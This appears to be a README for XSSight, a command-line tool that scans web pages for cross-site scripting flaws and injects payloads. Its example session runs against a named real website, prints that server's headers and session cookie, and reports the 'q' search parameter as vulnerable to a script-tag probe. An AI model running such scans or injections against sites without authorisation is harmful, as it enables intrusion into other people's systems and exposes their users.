# XSSight
It is script that can scan for XSS vulnerabilites and inject payloads.
Example:
	    .-'^`\                                        /`^'-.
	  .'   ___\                                      /___   `.
	 /    /.---.                                    .---.\    `
	|    //     '-.  ___________________________ .-'     \    |
	|   ;|         \/--------------------------//         |;   |
	\   ||       |\_)          XSSight         (_/|       ||   /
	 \  | \  . \ ;  |     By Team Ultimate     || ; / .  / |  /
	  '\_\ \ \ \ \ |                          ||/ / / // /_/'
	        \ \ \ \|       Beta Release       |/ / / //
	         `'-\_\_\     teamultimate.in     /_/_/-'`
	                '--------------------------' 
 These types of URLs are accepted
 Example: http://www.dwebsite.com/ 
 Example: http://www.website.com= 
 Example: http://www.website.com? 

 Enter target url: http://dramaonline.pk/search.php?q=    
------------------------------
Select an operation:
------------------------------
 1. XSS Scanner
 2. Payload Injector
 Enter your choice [1-2] : 1
Date: Mon, 27 Mar 2017 14:35:00 GMT
Server: Apache/2.2.3 (CentOS)
Cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Set-Cookie: PHPSESSID=b7amfe25hf7eradfobmh6q39a3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Vary: Accept-Encoding,User-Agent
Connection: close
Content-Type: text/html; charset=UTF-8

* scanning GET parameter 'q'
 (i) GET parameter 'q' appears to be XSS vulnerable ("<script>.'.xss.'.</script>", enclosed by <script> tags, inside single-quotes, no filtering)
